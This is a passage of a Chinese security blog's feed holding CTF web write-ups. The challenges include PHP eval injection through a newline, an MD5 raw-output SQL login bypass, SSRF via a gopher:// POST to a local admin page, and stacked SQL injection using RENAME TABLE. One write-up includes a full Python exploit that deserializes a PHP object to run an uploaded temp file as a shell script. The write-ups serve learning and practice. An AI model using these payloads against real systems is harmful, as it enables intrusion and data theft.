class="string">&#x27;unset(&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;);&#x27;</span>);    <span class="comment">#第530行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parts</span>[<span class="number">0</span>]==<span class="string">&#x27;SESSION&#x27;</span>) &#123;</span><br><span class="line">            session_commit();</span><br><span class="line">            session_start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追一下代码验证一下是不是<code>unset</code>触发的<code>clear()</code>，发现调用链条是<code>__unset($key)</code>→<code>offsetunset($key)</code>→<code>clear($key)</code>实锤</p><p>见里面有一个<code>compile()</code>，康康</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$evaluate</span>=<span class="literal">TRUE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!<span class="variable">$evaluate</span>)</span><br><span class="line">        ? preg_replace_callback(</span><br><span class="line">            <span class="string">&#x27;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#x27;</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expr</span>[<span class="number">2</span>]))</span><br><span class="line">                    <span class="variable">$str</span>.=preg_replace_callback(</span><br><span class="line">                        <span class="string">&#x27;/\.([^.\[\]]+)|\[((?:[^\[\]\&#x27;&quot;]*|(?R))*)\]/&#x27;</span>,</span><br><span class="line">                        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$sub</span></span>) </span>&#123;</span><br><span class="line">                            <span class="variable">$val</span>=<span class="keyword">isset</span>(<span class="variable">$sub</span>[<span class="number">2</span>]) ? <span class="variable">$sub</span>[<span class="number">2</span>] : <span class="variable">$sub</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (ctype_digit(<span class="variable">$val</span>))</span><br><span class="line">                                <span class="variable">$val</span>=(<span class="keyword">int</span>)<span class="variable">$val</span>;</span><br><span class="line">                            <span class="variable">$out</span>=<span class="string">&#x27;[&#x27;</span>.<span class="keyword">$this</span>-&gt;export(<span class="variable">$val</span>).<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="variable">$expr</span>[<span class="number">2</span>]</span><br><span class="line">                    );</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$str</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment">#------------------下面这段都无关，毕竟clear()里传了FALSE------------------</span></span><br><span class="line">        : preg_replace_callback(</span><br><span class="line">        <span class="string">&#x27;/(?&lt;!\w)@(\w+(?:(?:\-&gt;|::)\w+)?)&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27;((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\-&gt;|::)\w+|\()*)/&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#...</span></span><br></pre></td></tr></table></figure><p>看样子对输入做了改动，但其实不想分析<code>complie()</code>的话，直接<code>echo</code>即可知道到底eval了什么代码</p><blockquote>当a=hello<br>[Out] unset('$this->hive['hello']');</blockquote><p>但现在既然比赛已经结束那还是稍微深入看一下<code>complie()</code>，遇到了我没见过的php：回调，匿名函数</p><ul><li><p>回调：在函数执行的过程中，一般是不能去干预他的行为的，当函数被设计成带有回调功能时，我们就有可能在函数的执行过程中，通过回调函数去干预他</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$n</span>, <span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$n</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span> ? <span class="variable">$f</span>(<span class="variable">$i</span>) : <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无回调时</span></span><br><span class="line">foo(<span class="number">5</span>); <span class="comment">//01234</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//有回调时</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$v</span> + <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">5</span>, <span class="string">&#x27;f1&#x27;</span>); <span class="comment">//02468</span></span><br></pre></td></tr></table></figure></li><li><p>匿名函数：允许临时创建一个没有指定名称的函数。最经常用作回调函数<code>callable</code>回调参数的值</p></li></ul><p>而<code>preg_replace_callback</code>除了可以指定一个 <code>callback</code> 替代 <code>replacement</code> 进行替换字符串的计算，其他方面等同于<code>preg_replace</code></p><p>至于什么<code>$this-&gt;hive</code>之类的杂七杂八的都是后面才加上去的，和<code>compile()</code>无关</p><p>因为传参<code>a</code>会被<code>compile</code>处理为<code>[&#39;xxx&#39;]</code>的形式，所以需要打破这种格式，然后点号连接并闭合<code>unset</code>，最后<code>eval</code>执行任意代码</p><p>看看这个正则<code>&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;</code>，并没有匹配换行符，所以出了换行符这个正则就会被打断，于是便超度成功</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-%E6%8D%A2%E8%A1%8C%E7%AC%A6.png"></p><h2 id="慢慢做管理系统"><a href="#慢慢做管理系统" class="headerlink" title="慢慢做管理系统"></a>慢慢做管理系统</h2><blockquote>描述：这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag</blockquote><blockquote>hint：第一步登录的sql语句是"SELECT * FROM users WHERE password = '".md5($password,true)."' limit 0,1";</blockquote><p>这个题没有怎么动，目前也没找到复现，暂时只能面向wp扫盲</p><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-%E7%99%BB%E5%BD%95.png"></p><p>关键字是<code>md5($password,true)</code>，第二个参数<code>raw=true</code>即转md5后又做一次<code>hex2str</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table><p>所以hint描述的这一步其实是md5万能密码：<code>ffifdyop</code>与<code>129581926211651571912466741651878684928</code>在经过md5并转字符后均包含有<code>&#39;or&#39;</code>，只要<code>&#39;or&#39;</code>右边非零，即会判定整个表达式为true，以此便绕过了登录</p><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-gopher.png"></p><blockquote>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</blockquote><p>SSRF：Server-side Request Forge，服务端请求伪造；说白了就是：<i>因为是由服务端发起，从而能够请求到与它相连而与外网隔离的内部系统</i> 的一种攻击方式，比如通过file://，gopher://之类的协议来读本地文件什么的</p><p>本题是屏蔽了<code>file://</code>的，只能用<code>gopher://</code></p><p>Gopher协议格式：<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCP数据流</code></p><ul><li>gopher的默认端口是70</li><li>如果发起POST请求，请求体需要进行url编码，回车换行需要使用<code>%0d</code>或<code>%0a</code>代替</li></ul><p>payload：/ssrf.php?way=127.0.0.1/admin.php，发现admin.php不再302了</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-admin.png"></p><p>然后通过gopher协议给admin.php发POST数据，HTTP协议默认端口是80，所以是往<code>127.0.0.1:80</code>发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2Fadmin.php%20HTTP%2F1.1%0aHost%3A%20127.0.0.1%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0aContent-Length%3A%2027%0ausername%3Dtest%26password%3Dtest%0a</span><br></pre></td></tr></table></figure><blockquote>gopher://127.0.0.1:80/<br>_POST /admin.php HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br>username=test&password=test</blockquote><h3 id="改表名"><a href="#改表名" class="headerlink" title="改表名"></a>改表名</h3><p>通过改表名获取数据@2019强网杯，也可以通过<code>prepare</code>预处理<code>concat</code>过滤的<code>select</code>，预处理的方法之前就记录过，不再重复</p><p>当过滤了<code>select</code>，就不能在查出表名列名后选中数据，但若查询的回显就是表中的字段，则可以通过<code>rename</code>将默认查询的表替换为目标表，从而直接从回显获取字段</p><p>例如本题中<code>fake_admin</code>是默认被查询的表，<code>real_admin_here_do_you_find</code>是目标表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &quot;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;2;RENAME TABLE &#96;fake_admin&#96; TO &#96;fake_admin1&#96;;RENAME TABLE &#96;real_admin_here_do_you_find&#96; TO &#96;fake_admin&#96;;##&amp;password&#x3D;129581926211651571912466741651878684928&quot;;</span><br></pre></td></tr></table></figure><p>顺便记一下 [2019强网杯-随便注] 的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure><p>此处改列名<code>flag</code>为<code>id</code>是因为目标表中没有<code>id</code>列，而查询是根据id查询，避免了一开始无法查询的情况</p><p><code>CHANGE</code>的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE t1 CHANGE c_old c_new INTEGER ;#把名为c_old的列名改为c_new，类型为整数型</span><br></pre></td></tr></table></figure><h2 id="Internal-System"><a href="#Internal-System" class="headerlink" title="Internal System"></a>Internal System</h2><p>超出能力范围的部分有点多，积累起来了再说</p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录题目扫盲，只有前三题，包含以下points：&lt;/p&gt;
&lt;p&gt;​    ①3.28 php.net后门&lt;/p&gt;
&lt;p&gt;​    ②3F(FatFreeFramework)框架&lt;/p&gt;
&lt;p&gt;​    ③SQL中md5()产生hex的’or’进行的注入&lt;/p&gt;
&lt;p&gt;​    ④SSRF与gopher协议&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP奇怪的目录访问机制</title>
    <link href="https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"/>
    <id>https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/</id>
    <published>2021-03-28T13:14:32.000Z</published>
    <updated>2021-04-11T07:08:21.496Z</updated>
    
    <content type="html"><![CDATA[<p>来自于BUUCTF_Web解决数最多的[HCTF 2018]WarmUp，小记一下此题被我疏忽的零碎知识以及出题人的脑洞（虽然不大，但是我认为此题不面向wp而是硬做的话不会有这么多解决数 ¯\_(ツ)_/¯</p><span id="more"></span><h1 id="PHP奇怪的目录访问机制"><a href="#PHP奇怪的目录访问机制" class="headerlink" title="PHP奇怪的目录访问机制"></a>PHP奇怪的目录访问机制</h1><p>首先是脑洞，本题hint：<code>flag not here, and flag in ffffllllaaaagggg</code>，这个别致的flag传达的是：flag在上翻4级目录下。这个题上翻4级目录恰好到 linux 根目录，所以有些wp中堆叠很多个<code>../</code>也可以highlight到flag（大概是为了降低脑洞因素的存在感</p><p>再就是本文标题，本题需要在<code>highlight_file(__FILE__)</code>的情况下构造payload绕过其过滤，最后由<code>include</code>包含进来。但是为了绕过其过滤，传给include的路径是：<code>file=hint.php?/../../../../../ffffllllaaaagggg</code>，此路径能打开ffffllllaaaagggg的原因在于<code>hint.php?</code>这个文件并不存在，则php将其视为一个文件夹，flag在上翻 4 层后的目录下，因为已经进了 hint.php? 则还需退回 5 层</p><blockquote>这种访问不存在的目录然后又退回来的操作在linux的shell环境下并不支持，所以说令我感到奇怪</blockquote><p><img src="/images/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6_LinuxShell.PNG"></p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;来自于BUUCTF_Web解决数最多的[HCTF 2018]WarmUp，小记一下此题被我疏忽的零碎知识以及出题人的脑洞（虽然不大，但是我认为此题不面向wp而是硬做的话不会有这么多解决数 ¯\_(ツ)_/¯&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="PHP" scheme="https://kyriota.github.io/tags/PHP/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>miniL p</title>
    <link href="https://kyriota.github.io/2021/03/25/miniL_web_p/"/>
    <id>https://kyriota.github.io/2021/03/25/miniL_web_p/</id>
    <published>2021-03-25T15:40:17.000Z</published>
    <updated>2021-05-14T10:31:11.801Z</updated>
    
    <content type="html"><![CDATA[<p>考察php代码审计，临时文件窗口期的利用，以及linux指令的掌握，对我好难，还好有<code>blackWatch</code>的wp和协助</p><p>（据说是某原题搬运，碍于题量太少而没有找到原题在哪，但是这不重要</p><span id="more"></span><h1 id="miniL-Web-p"><a href="#miniL-Web-p" class="headerlink" title="miniL Web p"></a>miniL Web p</h1><p align='right'><small>这题就叫"p"，没有打错/doge</small></p><p><img src="/images/miniL-Web-p-preview.PNG"></p><h2 id="得到classes-php"><a href="#得到classes-php" class="headerlink" title="得到classes.php"></a>得到classes.php</h2><p>一进来index.php已高亮，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;classes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    setcookie(<span class="string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="keyword">new</span> gitee(<span class="string">&#x27;index.php&#x27;</span>))));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$comp</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>]));</span><br><span class="line">highlight_file(<span class="variable">$comp</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">你用上了Git，可是，代价是什么呢（悲）</span><br></pre></td></tr></table></figure><p>index包含了classes.php，根据要求传一个b64的cookie用作反序列化，从而高亮classes.php</p><p>classes.php如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gitee</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;你用上了Git，可是，代价是什么呢（悲）&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">github</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="string">&quot;~!@#%^&amp;*()（）-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split(<span class="variable">$blacklist</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;cmd, <span class="variable">$char</span>) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;serror&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;across the great ... nope&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你用上了Git，可是，代价是什么呢（悲）</span><br></pre></td></tr></table></figure><h2 id="临时文件窗口期利用"><a href="#临时文件窗口期利用" class="headerlink" title="临时文件窗口期利用"></a><a href="https://www.anquanke.com/post/id/201136">临时文件窗口期利用</a></h2><p>可见本题的解题关键在于<code>eval($this-&gt;cmd)</code>，但在eval执行之前$cmd已经被过滤的只剩个<code>p</code>和一些字符了，而对于此题的解法其实是相对固定的：即使用shell命令调用上传的文件，利用这一窗口期执行任意我们希望服务端执行的shell命令</p><p><img src="/images/miniL-Web-p-timeWindow.PNG"></p><p>如何利用：</p><ul><li><p>首先确定如何在仅有这么小点字符集的情况下访问到上传的临时文件 { Windwos下临时文件保存在<code>C:/Windows/Temp/</code>，命名为php[4个随机字符].tmp；Linux下保存在<code>/tmp/</code>，命名为php[随机6个字符] } 可以确定我们要找的是路径为<code>tmp/phpxxxxxx</code>的文件，结合Linux中的单字符通配符<code>?</code>，就可以找到它了</p>  <center><code>??p/p?p??????</code></center></li><li><p>现在确定上传怎样的文件才可以帮助我们找到flag，注意到反引号 <code>`</code> 没有被过滤，而php中反引号为执行运算符</p>  <blockquote>PHP将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）；使用反引号运算符的效果与函数shell_exec()相同。但这一切的前提是服务端允许一个这么危险的函数执行</blockquote><p>  句号 <code>.</code> 也没有被过滤，这在Linux中可以执行shell script，例如<code>./tmp/hello.sh</code>（但在实际操作中发现这个句号执行需要权限，不能直接打了就来，可能是服务端已经设置好了，所以才能执行），以下是对于shell的大致介绍</p>  <blockquote>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁；Shell 既是一种命令语言，又是一种程序设计语言<br>  需要关注的是 Bash，也就是 Bourne Again Shell，由于易用和免费，Bash 在日常工作中被广泛使用；同时，Bash 也是大多数Linux 系统默认的 Shell<br>  扩展名并不影响脚本执行，sh的后缀完全是为了方便用户理解这个文件大概是什么玩意儿，Linux根据文件头识别文件类型，不需要扩展名<br>  </blockquote><p>  只需基础的两个命令即可帮助我们获取flag：<code>cat</code>和<code>grep</code>，<code>*</code>作为匹配0至任意个字符的通配符，使得cat返回全部根目录下文件信息</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh\ncat /* | grep flag</span></span><br></pre></td></tr></table></figure></li><li><p>最后需要输出执行上述文件后返回的结果，需要用到的是php短标签</p>  <center><code>&#60;&#63;&#61;'233';&#63;&#62;</code> 等价于 <code>&#60;&#63;echo '233';&#63;&#62;</code></center></li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echo的快捷用法，但须在php.ini里打开short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</span></span><br><span class="line"><span class="comment">#                                          ↓                 ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            ↑</span></span><br><span class="line"><span class="comment">#                                     执行后面路径下的文件</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                打开根目录下全部文件并显示在标准输出</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   查找字符串</span></span><br><span class="line"><span class="comment">#                             ↓      ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 ↑         ↑       ↑</span></span><br><span class="line"><span class="comment">#                 |       换行符   pipe，以前面的返回作为参数来执行后面的命令，相当于在根目录里找flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!是一个特殊的表示符，其后跟着解释此脚本的shell路径</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;考察php代码审计，临时文件窗口期的利用，以及linux指令的掌握，对我好难，还好有&lt;code&gt;blackWatch&lt;/code&gt;的wp和协助&lt;/p&gt;
&lt;p&gt;（据说是某原题搬运，碍于题量太少而没有找到原题在哪，但是这不重要&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
    <category term="miniL" scheme="https://kyriota.github.io/tags/miniL/"/>
    
  </entry>
  
  <entry>
    <title>bugku 社工-初步收集</title>
    <link href="https://kyriota.github.io/2021/03/24/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/"/>
    <id>https://kyriota.github.io/2021/03/24/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-23T16:40:39.000Z</published>
    <updated>2021-05-14T10:31:52.800Z</updated>
    
